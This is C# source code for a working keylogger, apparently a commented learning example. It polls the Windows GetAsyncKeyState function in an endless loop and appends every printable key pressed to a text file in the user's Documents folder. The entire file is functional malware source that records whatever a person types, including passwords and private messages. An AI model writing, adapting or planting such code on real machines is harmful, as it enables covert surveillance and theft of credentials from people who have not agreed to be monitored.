using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KeyLogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {
            // Create a textfile which the program will write to and saves it directly into the MyDocuments folder
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            // Creates file name
            string path = (filepath +  @"\loggedkeysfile.txt");

            // If file doesn't exist, it'll be created
            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                    // Simply creating file, so nothing is needed in this body yet
                }

            }

            while(true)
            {
                // Let the application sleep for a brief moment because of the infinite loop
                // Thread is imported to use the Sleep function for 5 ms
                Thread.Sleep(5);

                // Loop that checks every key on keyboard
                // Starts with 32 according to ASCII Table in which 32 is 'Space' and everything after it are typical keys
                for(int i = 32; i < 127; i++)
                {
                    // Key state will always be 0 unless a key is pressed
                    int keyState = GetAsyncKeyState(i);

                    if (keyState == 32768)
                    { 
                        // Cast char onto i to get the actual key pressed instead of the assigned ASCII number
                        Console.WriteLine((char)i + ", ");

                        // Stores keys in text file
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }
                    }
                   

                }
            }

        }
    }
}
